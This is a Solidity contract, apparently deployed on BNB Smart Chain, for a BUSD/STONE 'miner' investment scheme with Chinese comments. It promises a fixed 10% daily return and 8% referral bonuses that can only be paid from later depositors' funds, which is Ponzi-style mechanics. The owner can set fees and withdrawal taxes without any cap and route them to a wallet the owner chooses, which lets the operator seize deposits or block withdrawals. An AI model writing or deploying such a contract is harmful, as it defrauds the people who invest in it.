/**
 *Submitted for verification at BscScan.com on 2022-05-05
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-15
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IToken {
function totalSupply() external view returns(uint256);
function balanceOf(address account) external view returns(uint256);
function transfer(address recipient, uint256 amount) external returns(bool);
function allowance(address owner, address spender) external view returns(uint256);
function approve(address spender, uint256 amount) external returns(bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);

event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);
        return a % b;
    }
}

contract BusdCrops {
    using SafeMath for uint256;
        IToken public token_BUSD;
    IToken public token_STONE;
    address erctoken = 0xCF55fb7Bef121a7C6AcBB44C5aCDA8d1ce8Fec02; /** BUSD Testnet **/
    //address erctoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; /** BUSD Mainnet **/
    address stonetoken = 0x2C80f25090ac08bF084bbe8194B00524D6b5D20d;/** STONE Testnet **/
    // address stonetoken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;/** STONE Mainnet **/

    uint256 public PERCENTS_DIVIDER = 1000;    //小数位数
    uint256 public MINER_PRICE = 50 * 1e18; //机器价格50U，不可以更改
    uint256 public STONE_MINER_PRICE = 10000 * 1e18; //1万石头购买一台机器 

    uint256 public MAX_USDT_DEPOSITS = 200; //最多购买200台USDT矿机
    uint256 public MAX_STONE_DEPOSITS = 100; //最多购买100台石头矿机

    uint256 public REFERRAL = 80;  //8% 推荐奖金
    uint256 public EGGS_TO_HIRE_1MINERS = 10; //每日每台机器产量 10% 
    uint256 public STONE_TO_HIRE_1MINERS = 100 * 1e18; //每日每台机器产出多少石头
    uint256 public EXCHANGE_RATIO_OF_STONE_AND_USDT = 0;  //石头与U的兑换比例 1U=多少石头
    uint256 public TAX = 50;   //手续费5%
    uint256 public WITHDRAWAL_AWARD_RATIO = 200;// 第一次提现奖励20%
    uint256 public WITHDRAWAL_TAX = 500;  //提现50%税费 
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 3; //3天没有提现，不扣除税费 
    uint256 public withdrawalIntervalTakes = 3600 * 12; //提现间隔时间

    uint256 public totalBetAmount;  //投资总金额
    uint256 public totalWithdrawn; //总提现
    address public owner;
    address public mkt;

    struct UserAssets
    {
        uint256 usdtMiners;               //usdt 矿工雇佣数
        uint256 usdtBuyTotalAmount;       //usdt雇佣矿工金额
        uint256 usdtTotalWithdrawn;        //usdt已提现收益

        uint256 stMiners;               //st 矿工雇佣数
        uint256 stBuyTotalAmount;       //st雇佣矿工金额
        uint256 stTotalWithdrawn;        //st已提现收益
      
    }
    struct User {
        uint256 beforeWithdrawnAmount; //用户未提现之后金额
        uint256 beforeStoneWithdrawnAmount; //石头未提现之前数量
        address referrer; //推荐人
        uint256 referralsCount; //推广总数
        uint256 referralEggRewards; //推荐奖励
        uint256 continuityDays; //0未达到连续7天 1已达到连续7天
        uint256 lastHatch; //最后孵化时间
        uint256 intervalTime;
        
    }

    mapping(address => User) public users;
    mapping(address => UserAssets) public assets;

    constructor(address _mkt) {
        require(!isContract(_mkt));
        owner = msg.sender;
        mkt = _mkt;
        token_BUSD = IToken(erctoken);
        token_STONE = IToken(stonetoken);
    }

    //获取基本信息
    function getBaseInfo() public view returns(
        uint256 _percentsDivider,
        uint256 _minerPrice,
        uint256 _stooneMinerPrice,
        uint256 _userMaxUserDeposits,
        uint256 _eggsToHireMiners,
        uint256 _stoneToHireMiners,

        uint256 _exchangeRatioOfStoneAndUsdt,
        uint256 _tax,
        uint256 _withdrawalAwardRatio,
        uint256 _withdrawalTax,
        uint256 _totalBetAmount,
        uint256 _totalWithdrawn
    ) {

        _percentsDivider = PERCENTS_DIVIDER;
        _minerPrice = MINER_PRICE;
        _stooneMinerPrice = STONE_MINER_PRICE;
        _userMaxUserDeposits = MAX_USDT_DEPOSITS;
        _eggsToHireMiners = EGGS_TO_HIRE_1MINERS;
        _stoneToHireMiners = STONE_TO_HIRE_1MINERS;

        _exchangeRatioOfStoneAndUsdt = EXCHANGE_RATIO_OF_STONE_AND_USDT;
        _tax = TAX;
        _withdrawalAwardRatio = WITHDRAWAL_AWARD_RATIO;
        _withdrawalTax = WITHDRAWAL_TAX;

        _totalBetAmount = totalBetAmount;
        _totalWithdrawn = totalWithdrawn;
    }


    //获取用户信息 
    function getUserInfo(address _adr) public view returns(
        uint256 _usdtMiners,
        uint256 _usdtBuyTotalAmount,
        uint256 _usdtTotalWithdrawn,
        uint256 _stMiners,
        uint256 _stBuyTotalAmount,
        uint256 _stTotalWithdrawn,

        uint256 _beforeWithdrawnAmount,
        uint256 _beforeStoneWithdrawnAmount,
        address _referrer,
        uint256 _referralsCount,
        uint256 _referralEggRewards,
        uint256 _continuityDays

    ) {
        _usdtMiners = assets[_adr].usdtMiners;
        _usdtBuyTotalAmount = assets[_adr].usdtBuyTotalAmount;
        _usdtTotalWithdrawn = assets[_adr].usdtTotalWithdrawn;
        _stMiners = assets[_adr].stMiners;
        _stBuyTotalAmount = assets[_adr].stBuyTotalAmount;
        _stTotalWithdrawn = assets[_adr].stTotalWithdrawn;

        _beforeWithdrawnAmount = users[_adr].beforeWithdrawnAmount;
        _beforeStoneWithdrawnAmount = users[_adr].beforeStoneWithdrawnAmount;
        _referrer = users[_adr].referrer;
        _referralsCount = users[_adr].referralsCount;
        _referralEggRewards = users[_adr].referralEggRewards;
        _continuityDays = users[_adr].continuityDays;

    }
 
    //USDT 购买矿机
    function buyMinersByUsdt(address ref, uint256 amount) external{

        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];
        require(amount >= MINER_PRICE, "Mininum investment not met.");
        //限制一个用户购买金额
        require(userAssets.usdtMiners.add(amount.div(MINER_PRICE)) <= MAX_USDT_DEPOSITS, "Max deposit limit reached.");
        token_BUSD.transferFrom(address(msg.sender), address(this), amount);

        //推荐人
        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }
            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
        //给上级返奖励
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                //推荐用户奖励8% 
                uint256 refRewards = amount.mul(REFERRAL).div(PERCENTS_DIVIDER);
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
            }
        }
        //支付手续费到钱包
        payFees(amount);

        userAssets.usdtBuyTotalAmount = userAssets.usdtBuyTotalAmount.add(amount); //用户投注总额
        totalBetAmount = totalBetAmount.add(amount);  //投资总金额

        //处理业务 
        uint256 buyMiner = amount.div(MINER_PRICE);
        userAssets.usdtMiners = userAssets.usdtMiners.add(buyMiner); //每日产量百分比

        user.beforeWithdrawnAmount = getUserUsdtProfit(msg.sender);
        user.beforeStoneWithdrawnAmount = getUserStoneProfit(msg.sender);
        user.lastHatch = block.timestamp;
    }

    

    //USDT提现
    function usdtWithdrawn() external{
        //石头提现
        require(EXCHANGE_RATIO_OF_STONE_AND_USDT <= 0, "Insufficient usdt balance.");
       
        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];

        uint256 intervalTime = block.timestamp - user.intervalTime;
        require(intervalTime > withdrawalIntervalTakes, "The withdrawal interval takes 12 hours.");
        
        //提现=用户池子+投注前
        uint256 userProfit = getUserUsdtProfit(msg.sender);
        uint256 withdrawnAmount = user.beforeWithdrawnAmount.add(userProfit);

        //支付手续费
        uint256 tax = payFees(withdrawnAmount);
        userAssets.usdtTotalWithdrawn = userAssets.usdtTotalWithdrawn.add(withdrawnAmount);  //提现总额
        totalWithdrawn = totalWithdrawn.add(withdrawnAmount);  //总提现额度

        //未连续7天提现
        if (user.continuityDays == 0) {
            uint256 cdays = getContinuityDays(msg.sender);
            if (cdays < COMPOUND_FOR_NO_TAX_WITHDRAWAL) {
                //扣50%手续费
                withdrawnAmount = withdrawnAmount.sub(withdrawnAmount.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
            }
            else {
                //设置以后不扣手续费并且额外奖励20%
                withdrawnAmount = withdrawnAmount.add(withdrawnAmount.mul(WITHDRAWAL_AWARD_RATIO).div(PERCENTS_DIVIDER));
                user.continuityDays = 1;
            }
        }
        //扣税后-手续费
        withdrawnAmount = withdrawnAmount - tax; 
        token_BUSD.transfer(msg.sender, withdrawnAmount);  //提现
      
        user.beforeStoneWithdrawnAmount = getUserStoneProfit(msg.sender);
        user.lastHatch = block.timestamp;
        user.intervalTime = block.timestamp;
        user.beforeWithdrawnAmount = 0;

    }
    //推荐提现提现
    function referralWithdrawn() external{
        User storage user = users[msg.sender];
        require(user.referralEggRewards > 0, "Insufficient usdt balance.");

        uint256 tax = payFees(user.referralEggRewards);
        uint256 amount = user.referralEggRewards - tax;
        
        token_BUSD.transfer(msg.sender, amount);  //提现
        user.referralEggRewards = 0;
    }
    //------------------------------------------------------------------

    //提出石头
    function withdrawStone() external{
        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];
        uint256 amount = getUserStoneProfit(msg.sender).add(user.beforeStoneWithdrawnAmount);

        require(amount > 0, "Insufficient st balance.");

        //USDT转石头
        if (EXCHANGE_RATIO_OF_STONE_AND_USDT > 0) {
            user.beforeWithdrawnAmount = 0;
            user.lastHatch = block.timestamp;
        }

        userAssets.stTotalWithdrawn = userAssets.stTotalWithdrawn.add(amount);  //提现总额

        uint256 tax = amount.mul(TAX).div(PERCENTS_DIVIDER);
        //总额-手续费
        amount = amount - tax;
        token_STONE.transfer(msg.sender, amount);

        user.beforeWithdrawnAmount = getUserUsdtProfit(msg.sender);
        user.lastHatch = block.timestamp;
        user.beforeStoneWithdrawnAmount = 0; 
    }

    //石头余额购买矿机->测试通过
    function buyMinersByStone(uint256 amount) external{

        
        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];

        //限制一个用户购买金额
        require(userAssets.stMiners.add(amount.div(STONE_MINER_PRICE)) <= MAX_STONE_DEPOSITS, "Max deposit limit reached.");

        uint256 stoneProfit = getUserStoneProfit(msg.sender);
        uint256 stoneAmount = stoneProfit + user.beforeStoneWithdrawnAmount;

        require(stoneAmount >= amount, "Insufficient stone balance.");

        //处理业务
        uint256 buyAmount = amount.div(STONE_MINER_PRICE);
        userAssets.stMiners = userAssets.stMiners.add(buyAmount); //矿机总数量
        userAssets.stBuyTotalAmount = userAssets.stBuyTotalAmount.add(amount); //用户投注总额

        user.beforeStoneWithdrawnAmount = stoneAmount - amount;
        user.beforeWithdrawnAmount = getUserUsdtProfit(msg.sender);
        user.lastHatch = block.timestamp;
      

    }

    //石头钱包购买矿机
    function buyMinersByStoneWallet(uint256 amount) external{

        

        User storage user = users[msg.sender];
        UserAssets storage userAssets = assets[msg.sender];

        //限制一个用户购买金额
        require(userAssets.stMiners.add(amount.div(STONE_MINER_PRICE)) <= MAX_STONE_DEPOSITS, "Max deposit limit reached.");

        token_STONE.transferFrom(address(msg.sender), address(this), amount);
        //处理业务
        uint256 buyMiner = amount.div(STONE_MINER_PRICE);
        userAssets.stMiners = userAssets.stMiners.add(buyMiner); //每日产量百分比 
        userAssets.stBuyTotalAmount = userAssets.stBuyTotalAmount.add(amount); //用户投注总额

        user.beforeStoneWithdrawnAmount = getUserStoneProfit(msg.sender); 
        user.beforeWithdrawnAmount = getUserUsdtProfit(msg.sender);
        user.lastHatch = block.timestamp;
        
    }
    //--------------------------------------------------------------

    //支付手续费到各各钱包 add，sub，mul，div分别表示加减乘除
    function payFees(uint256 amount) internal returns(uint256) {
        uint256 tax = amount.mul(TAX).div(PERCENTS_DIVIDER);
        token_BUSD.transfer(mkt, tax);
        return tax;
    }
    //获取石头账号余额
    function getInStoneBalance() public view returns(uint256) {
        User storage user = users[msg.sender];
        uint256 amount = getUserStoneProfit(msg.sender).add(user.beforeStoneWithdrawnAmount);
        return amount;
    }
    //方法-----------------------------------------------------------------------------------
    //获取用户USDT可用利润总额
    function getUserUsdtProfit(address _adr) public view returns(uint256) {
        uint256 result = 0;
        if (EXCHANGE_RATIO_OF_STONE_AND_USDT <= 0) {
            User storage user = users[_adr];
            UserAssets storage userAssets = assets[_adr];
            if (user.lastHatch > 0) {
                uint256 dt = block.timestamp - user.lastHatch;
                result = dt.mul(userAssets.usdtMiners + userAssets.stMiners).mul(MINER_PRICE).mul(EGGS_TO_HIRE_1MINERS).div(PERCENTS_DIVIDER).div(3600 * 24);
                //天数*机器数量*每天收益百分比
            }
        }
      
        return result;
    }
   
       
    //获取用户可用石头总额
    function getUserStoneProfit(address _adr) public view returns(uint256) {
        User storage user = users[_adr];
        UserAssets storage userAssets = assets[_adr];
        uint256 result = 0;
        if (user.lastHatch > 0) {
            uint256 dt = block.timestamp - user.lastHatch;
            result = dt.mul(userAssets.usdtMiners + userAssets.stMiners).mul(STONE_TO_HIRE_1MINERS).div(3600 * 24);
            //天数*机器数量*每天产出石头数量
        }

        //usdt转石头
        if (EXCHANGE_RATIO_OF_STONE_AND_USDT > 0) {
            uint256 dt = block.timestamp - user.lastHatch;
            uint256 usdtAmount = dt.mul(userAssets.usdtMiners + userAssets.stMiners).mul(MINER_PRICE).mul(EGGS_TO_HIRE_1MINERS).div(PERCENTS_DIVIDER).div(3600 * 24);

            usdtAmount = usdtAmount.add(user.beforeWithdrawnAmount);
            uint256 stoneAmount = usdtAmount.mul(EXCHANGE_RATIO_OF_STONE_AND_USDT);
            result = result + stoneAmount;
        }


        return result;
    }
    //从开始未提示的连续天数
    function getContinuityDays(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
        uint256 cdays = secondsSinceLastHatch.div(3600 * 24);
        return cdays;
    }
    //是否合约地址
    function isContract(address addr) internal view returns(bool) {
        uint size;
        assembly { size:= extcodesize(addr) }
        return size > 0;
    }
    function getBalance() public view returns(uint256) {
        return token_BUSD.balanceOf(address(this));
    }
    //设置--------------------------------------------------------------------------------
    //转移owner地址
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }
    //设置手续费地址
    function CHANGE_MKT_WALLET(address value) external {
        require(msg.sender == owner, "Admin use only.");
        mkt = value;
    }

    /** percentage setters **/
    //设置USDT购买矿工价格
    function SET_MINER_PRICE(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        MINER_PRICE = value * 1e18;
    }

    //设置石头购买矿工价格
    function SET_STONE_MINER_PRICE(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        STONE_MINER_PRICE = value * 1e18;
    }

    //设置手续费，双向 百分比*1000
    function SET_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        TAX = value;
    }
    //设置连续未提奖励比例 百分比*1000
    function SET_WITHDRAWAL_AWARD_RATIO(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        WITHDRAWAL_AWARD_RATIO = value;
    }

    //设置税费 百分比*1000
    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        WITHDRAWAL_TAX = value;
    }

    //设置石头与U的兑换比例 1U=1000
    function SET_EXCHANGE_RATIO_OF_STONE_AND_USDT(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        EXCHANGE_RATIO_OF_STONE_AND_USDT = value * 1e18;
    }
    //设置提现间隔秒数
    function SET_WITHDRAWAL_INTERVAL_TAKES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        withdrawalIntervalTakes = value;
    }

    //设置最多USDT购买矿机数
    function SET_MAX_USDT_DEPOSITS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        MAX_USDT_DEPOSITS = value;
    }

     //设置最多石头购买矿机数
    function SET_MAX_STONE_DEPOSITS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        MAX_STONE_DEPOSITS = value;
    }
     
}